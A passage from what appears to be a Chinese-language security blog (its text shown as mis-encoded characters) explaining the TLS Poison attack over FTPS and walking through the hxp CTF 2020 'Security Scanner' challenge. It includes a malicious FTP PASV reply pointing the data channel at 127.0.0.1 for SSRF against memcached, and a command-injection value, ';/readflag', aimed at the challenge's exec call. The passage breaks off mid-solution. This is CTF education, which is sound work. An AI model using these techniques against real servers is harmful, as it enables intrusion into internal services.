class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">listen</span>=<span class="hljs-literal">NO</span></span><br><span class="line"><span class="hljs-attr">listen_ipv6</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">anonymous_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">local_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">write_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">local_umask</span>=<span class="hljs-number">022</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">anon_root</span>=/var/ftp/</span><br><span class="line"><span class="hljs-attr">no_anon_password</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">hide_ids</span>=<span class="hljs-literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">dirmessage_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">use_localtime</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">xferlog_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">connect_from_port_20</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">secure_chroot_dir</span>=/var/run/vsftpd/empty</span><br><span class="line"><span class="hljs-attr">pam_service_name</span>=vsftpd</span><br><span class="line"><span class="hljs-attr">pasv_enable</span>=<span class="hljs-literal">Yes</span></span><br><span class="line"><span class="hljs-attr">pasv_min_port</span>=<span class="hljs-number">10000</span></span><br><span class="line"><span class="hljs-attr">pasv_max_port</span>=<span class="hljs-number">11000</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">rsa_cert_file</span>=/home/ubuntu/tls/fullchain.pem</span><br><span class="line"><span class="hljs-attr">rsa_private_key_file</span>=/home/ubuntu/tls/privkey.pem</span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">ssl_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">ssl_ciphers</span>=HIGH</span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">allow_anon_ssl</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">force_local_data_ssl</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">force_local_logins_ssl</span>=<span class="hljs-literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">ssl_tlsv1</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">ssl_sslv2</span>=<span class="hljs-literal">NO</span></span><br><span class="line"><span class="hljs-attr">ssl_sslv3</span>=<span class="hljs-literal">NO</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">listen_port</span>=<span class="hljs-number">11211</span></span><br><span class="line"><span class="hljs-attr">implicit_ssl</span>=<span class="hljs-literal">YES</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>è¯·æŒ‰ç…§å…¶ä»–æ•™ç¨‹ç”³è¯·å¯¹åº”åŸŸåè¯ä¹¦ã€é…ç½®å¥½åŒ¿å ssl è®¿é—® vsftpd ï¼Œå¦åˆ™å¾ˆå®¹æ˜“å¯¼è‡´ vsftpd æŠ¥é”™ï¼Œå¹¶ä¸”æ£€æŸ¥å¥½ vsftpd çŠ¶æ€æ˜¯å¦æˆåŠŸè¿è¡Œã€‚</p><p>é…ç½®å¥½ vsftpd åä½¿ç”¨ curl è¿›è¡Œè®¿é—®:</p><p></p><figure class="highlight groovy hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="hljs-string">ftps:</span><span class="hljs-comment">//exmaple.com -v</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>è¿™é‡Œæˆ‘å¦å¤–å¢åŠ äº†<code>--tls-max 1.2</code>é€‰é¡¹ï¼Œå› ä¸ºåœ¨ TLS 1.3 å½“ä¸­ï¼Œ Session ID ä¼ è¾“åœ¨åŠ å¯†è¿‡ç¨‹ä¸­ï¼Œä¸ä¾¿è§‚å¯Ÿï¼Œè€Œ TLS 1.2 å¯ä»¥åœ¨ Server Hello æ¶ˆæ¯ä¸­çœ‹åˆ° TLS Server è®¾ç½®çš„ Session IDï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<code>--tls-max 1.2</code>è¿«ä½¿ curl æœ€å¤§ä½¿ç”¨ TLS 1.2 ç‰ˆæœ¬ã€‚</p><p>æˆ‘ä»¬å°±å¯ä»¥è§‚å¯Ÿåˆ°å¦‚ä¸‹å›¾æ‰€ç¤ºç°è±¡ï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510123202.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ä¹Ÿæ˜¯åœ¨ä½¿ç”¨<code>PASV</code>å‘½ä»¤ä¹‹åï¼Œä¹Ÿå°±æ˜¯æ•°æ®ä¼ è¾“é˜¶æ®µæ—¶ï¼Œé‡æ–°ä½¿ç”¨äº† Session ID è¿›è¡Œå»ºç«‹ TLS ä¼šè¯ã€‚</p><h3 id="PASV"><a href="#PASV" class="headerlink" title="PASV"></a>PASV</h3><p>æ—¢ç„¶ç¡®å®šäº†å¯ä»¥é‡ç”¨ TLS ä¼šè¯ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯ DNS Rebinding çš„é—®é¢˜ï¼Œä¹Ÿæ˜¯ TLS Poison æ”»å‡»ä¸­çš„å…³é”®é—®é¢˜ã€‚</p><p>ä½†æ˜¯ä¼—æ‰€å‘¨çŸ¥ï¼Œç‰¹åˆ«æ˜¯åœ¨è¿‡å»çš„ä¸€å¹´å½“ä¸­ï¼ŒFTP åœ¨ CTF ä¸­çš„åˆ©ç”¨å‡ºç°å¾—ä¹Ÿç®—æ¯”è¾ƒå¤šçš„äº†ï¼Œåˆ©ç”¨ä¸»åŠ¨ã€è¢«åŠ¨æ¨¡å¼è¿›è¡Œ SSRF ä¹Ÿä¸å¹¶ä¸æ˜¯æ–°é²œçš„ Trick äº†ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬è¿˜å¯ä»¥ FTPS æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯é»˜è®¤å‘é€çš„<code>PASV</code>å‘½ä»¤ç»™äºˆæ¶æ„å›å¤ä¸º<code>227 Entering Passive Mode (127,0,0,1,43,203)</code>ï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªç®€å•çš„ â€œDNS Rebindingâ€ æ•ˆæœäº†ã€‚</p><p>ä½†æ˜¯ä¼—æ‰€å‘¨çŸ¥ï¼Œè¿™ç§å° Trick åº”è¯¥è¢«è§†ä¸ºä¸€ç§æ¼æ´ï¼Œå› ä¸ºåœ¨è®¾è®¡ä¹‹åˆï¼Œæœ¬æ¥å°±åº”è¯¥å°† FTP å®¢æˆ·ç«¯ã€æœåŠ¡ç«¯è¿›è¡Œç»‘å®šï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ— è®º FTP ä½¿ç”¨è¢«åŠ¨è¿˜æ˜¯ä¸»åŠ¨æ¨¡å¼ï¼Œéƒ½åº”è¯¥æ˜¯æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯ä¹‹é—´è¿›è¡Œå»ºç«‹æ§åˆ¶æµä¸æ•°æ®æµï¼Œå¹¶ä¸åº”è¯¥ä¸ç¬¬ä¸‰è€…è¿›è¡Œï¼Œå†µä¸”å¦‚æœæ”»å‡»è€…æ¶æ„å°†æ•°æ®æµå®šå‘åˆ°å†…ç½‘ç«¯å£å°±ææ˜“äº§ç”Ÿ SSRF ã€‚</p><p>æ‰€ä»¥ï¼ŒFirefox æ—©åœ¨ 2007 å¹´å°±ä¿®å¤äº† FTP å¸¦æ¥çš„è¿™ä¸ªé—®é¢˜ï¼Œå¹¶åˆ†é…äº† CVE ç¼–å·ï¼šCVE-2007-1562 ï¼Œè€Œ curl è¿Ÿè¿Ÿåœ¨ 2020 å¹´æ‰è¢«å‘ç°è¿™ç±»é—®é¢˜å¹¶ä¿®å¤ï¼Œä¹Ÿåˆ†é…äº† CVE ç¼–å·ï¼šCVE-2020-8284ã€‚curl ç‰ˆæœ¬åœ¨ 4.0 ä¸ 7.73.0 ä¹‹é—´éƒ½ä¼šå—åˆ°è¯¥ç§æ¼æ´çš„å½±å“ï¼Œè¯¦è§ï¼š<a href="https://curl.se/docs/CVE-2020-8284.html" target="_blank" rel="noopener">trusting FTP PASV responses</a></p><p>æ‰€ä»¥å¯¹äº FTPS æ¥è¯´ï¼Œåªè¦å­˜åœ¨<code>PASV</code>è¿™ä¸ªæ¼æ´ï¼Œå°±å¯ä»¥éå¸¸æ–¹ä¾¿åœ°ä½¿ç”¨ TLS Poison è¿›è¡Œæ”»å‡»ã€‚å…·ä½“æ­¥éª¤ä¸ºï¼š</p><ol><li>curl è®¿é—® ftps æœåŠ¡å™¨ï¼Œå¹¶ä¸å…¶å»ºç«‹ tls æ¡æ‰‹</li><li>ftps æœåŠ¡å™¨åœ¨å»ºç«‹ tls è¿æ¥æ—¶è®¾ç½®æ¶æ„ session id</li><li>ftps å¯¹äº curl å‘å‡ºçš„<code>pasv</code>å‘½ä»¤è¿”å›<code>(127,0,0,1,43,203)</code>ï¼Œå¹¶ç­‰å¾…æ¥ä¸‹æ¥çš„<code>LIST</code>ç­‰å‘½ä»¤</li><li>ä¹‹å curl æ‰ä¼šä¸ 127.0.0.1:11211 å°è¯•é‡ç”¨ session id å»ºç«‹ TLS ä¼šè¯</li></ol><p>å¥½äº†ï¼Œç†Ÿæ‚‰äº† TLS Poison æ”»å‡»ä»¥åŠç¡®å®š FTPS ä¸¤ä¸ªå½¢å¼éƒ½å¯èƒ½å—åˆ° TLS Poison æ”»å‡»ï¼Œé‚£æ¥ä¸‹æ¥æˆ‘ä»¬å°±æ¥äº²è‡ªä½“éªŒä¸€ä¸‹åœ¨ CTF å½“ä¸­çš„åº”ç”¨å§ã€‚</p><h2 id="HXP-CTF-Security-Scanner"><a href="#HXP-CTF-Security-Scanner" class="headerlink" title="HXP CTF - Security Scanner"></a>HXP CTF - Security Scanner</h2><p>è¿™æ˜¯æ¥è‡ª 2020 å¹´ hxp CTF å½“ä¸­çš„ä¸€é“ web æ–¹å‘é¢˜ç›®ï¼Œåˆ° hxp æ¯”èµ›ç»“æŸåªæœ‰ä¸¤è§£ï¼Œç®—æ˜¯ä¸€é“æ¯”è¾ƒéš¾çš„é¢˜ç›®ã€‚è¿™ä¸ªé¢˜ç›®å…¶å®æˆ‘å¾ˆæ—©å°±åšå¤ç›˜çš„ä¸€ä¸ªé¢˜ï¼Œåˆ©ç”¨äº†ä»Šå¹´ DEF CON ç­‰ web çš„æ—¶é—´æŠŠè¿™ä¸ªé¢˜åšäº†ä¸€æ¬¡ç®€å•çš„å¤ç›˜ã€‚</p><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>â€‹    Finally, after all these years computers are stealing my job.</p><p>Try our new robotic security scanner.</p></blockquote><p>Author: <a href="https://bierbaumer.net/" target="_blank" rel="noopener">0xbb</a> </p><p>ä¸»è¦é¢˜ç›®æºç ï¼š</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">'sandbox'</span>])) {</span><br><span class="line">    $id = <span class="hljs-string">''</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span>(strlen($id) &lt; <span class="hljs-number">10</span>) {</span><br><span class="line">        $b = random_bytes(<span class="hljs-number">1</span>);</span><br><span class="line">        <span class="hljs-keyword">if</span>(ord($b) &gt; <span class="hljs-number">32</span> &amp;&amp; ord($b) != <span class="hljs-number">0x7f</span>) {</span><br><span class="line">            $id .= $b;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    $_SESSION[<span class="hljs-string">'sandbox'</span>] = $id;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h1&gt;Sandbox&lt;/h1&gt;'</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;code&gt;'</span>.base64_encode($_SESSION[<span class="hljs-string">'sandbox'</span>]).<span class="hljs-string">'&lt;/code&gt;'</span>;  </span><br><span class="line"></span><br><span class="line">$m = <span class="hljs-keyword">new</span> Memcached();</span><br><span class="line">$m-&gt;addServer(<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">11211</span>);</span><br><span class="line"></span><br><span class="line">$url = strval($_GET[<span class="hljs-string">'url'</span>]);</span><br><span class="line"><span class="hljs-keyword">if</span> ($m-&gt;get($_SESSION[<span class="hljs-string">'sandbox'</span>].$url) !== <span class="hljs-string">'OK'</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/^[0-9a-zA-Z:\.\/-]{1,64}$/'</span>, $url) !== <span class="hljs-number">1</span>) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">'security :('</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $git_check = <span class="hljs-string">"001e# service=git-upload-pack\n"</span>;</span><br><span class="line">    $data = file_get_contents($url .<span class="hljs-string">'/info/refs?service=git-upload-pack'</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ($data  === <span class="hljs-keyword">FALSE</span> || substr($data, <span class="hljs-number">0</span>, strlen($git_check)) !== $git_check) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"doesn't look like git :("</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $m-&gt;set($_SESSION[<span class="hljs-string">'sandbox'</span>].$url, <span class="hljs-string">'OK'</span>, time() + <span class="hljs-number">300</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$output = [];</span><br><span class="line">$return_var = <span class="hljs-number">1</span>;</span><br><span class="line">exec(<span class="hljs-string">"timeout -s KILL 3 git ls-remote --tags -- $url"</span>, $output, $return_var);</span><br><span class="line"><span class="hljs-keyword">if</span>($return_var !== <span class="hljs-number">0</span>) {</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">'analysis failed :('</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h1&gt;Analysis&lt;/h1&gt;'</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"URL: ${url}"</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h2&gt;Tags&lt;/h2&gt;'</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;ul&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">foreach</span>($output <span class="hljs-keyword">as</span> $l) {</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;li&gt;&lt;code&gt;${l}&lt;/code&gt;&lt;/li&gt;"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;/ul&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h2&gt;Result&lt;/h2&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">TRUE</span>) { <span class="hljs-comment">// patented algorithm (tm)</span></span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">'Likely insecure :('</span>; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>å®¡è®¡ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºä»£ç æ‰§è¡Œçš„ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ç”Ÿæˆéšæœºå­—ç¬¦ä¸²åš SANDBOX</li><li>ç”¨æˆ·è¾“å…¥ url åï¼Œä» Memecached ä¸­è·å–é”®å€¼ä¸º SANDBOX + url çš„ Value å€¼ï¼Œåˆ¤æ–­æ˜¯å¦ä¸º â€œOKâ€<ul><li>å¦‚æœä¸æ˜¯ï¼Œé€šè¿‡<code>^[0-9a-zA-Z:\.\/-]{1,64}$</code>æ­£åˆ™åï¼Œé€šè¿‡<code>file_get_contents</code>è®¿é—®<code>$url .'/info/refs?service=git-upload-pack'</code>ï¼Œæ£€æŸ¥ç»“æœæ˜¯å¦ä»¥<code>001e# service=git-upload-pack\n</code>å¼€å¤´<ul><li>å¦‚æœä¸æ˜¯ä»¥<code>001e# service=git-upload-pack\n</code>å¼€å¤´ï¼Œåˆ™ç»“æŸç¨‹åº</li><li>å¦‚æœæ˜¯ï¼Œåˆ™ä¼šåœ¨ Memecached ä¸­å°†é”®å€¼ä¸º SANDBOX + url çš„ Value å€¼è®¾ç½®ä¸º â€œOKâ€ï¼Œæ—¶é—´ä¸º 5min</li></ul></li><li>å¦‚æœæ˜¯ â€œOKâ€ ï¼Œåˆ™ä¼šä½¿ç”¨<code>exec</code>æ‰§è¡Œå‘½ä»¤<code>timeout -s KILL 3 git ls-remote --tags -- $url</code>ï¼Œå¦‚æœè®¿é—®æˆåŠŸåˆ™è¾“å‡ºå“åº”</li></ul></li></ul><p>æ•´ä¸ªä»£ç æµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/good_workflow.png" alt=""></p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution 1"></a>Solution 1</h3><p>From: <a href="https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/security%20scanner" target="_blank" rel="noopener">https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/security%20scanner</a></p><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ç¬¬ä¸€ç§è§£æ³•ï¼Œè¿™ä¹Ÿæ˜¯ perfect guesser ä»–ä»¬ä½¿ç”¨çš„ç±»ä¼¼è§£æ³•ï¼Œé€šè¿‡ HTTPS æ¥è¿›è¡Œè§£é¢˜ã€‚</p><p>é¢˜ç›®å”¯ä¸€ä¸€å¤„å¯ä»¥è®©æˆ‘ä»¬ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„åœ°æ–¹å°±æ˜¯<code>exec</code>å¤„äº†ï¼Œæ‰€ä»¥å¦‚æœæ²¡æœ‰å…¶ä»–æ ¡éªŒéªŒè¯çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨å‘½ä»¤æ³¨å…¥è¿›è¡Œ RCE ï¼Œä¾‹å¦‚ä¼ å…¥<code>url=;/readflag</code>ï¼Œè¿™æ ·é¢˜ç›®æ‰§è¡Œé¡ºåºå¦‚ä¸‹æµç¨‹å›¾æ‰€ç¤ºï¼š</p><p><img 